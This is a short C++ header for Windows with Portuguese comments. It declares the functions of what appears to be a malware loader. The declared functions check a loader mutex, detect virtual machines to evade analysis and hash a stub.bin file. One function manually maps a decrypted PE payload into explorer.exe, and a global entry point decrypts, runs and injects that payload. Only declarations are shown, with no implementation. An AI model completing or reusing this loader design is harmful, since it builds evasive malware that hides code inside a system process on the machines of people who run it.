#pragma once

#include <windows.h>
#include <vector>
#include <string>

// Mutex/anti-VM/anti-fingerprint
bool CheckMutexLoader();                  // Checa/fixa mutex do loader
bool BasicVMDetection();                  // Checa presença de VM
std::string GetFileHash(const std::string& f); // Calcula hash do arquivo stub.bin

// Injection PE RAM/manual mapping
bool ManualInjectPE(std::vector<BYTE>& payload);    // Injeta payload na explorer.exe

// Loader principal
void LoaderEntry();                       // Entrada global do loader (decripta/roda/injeta payload)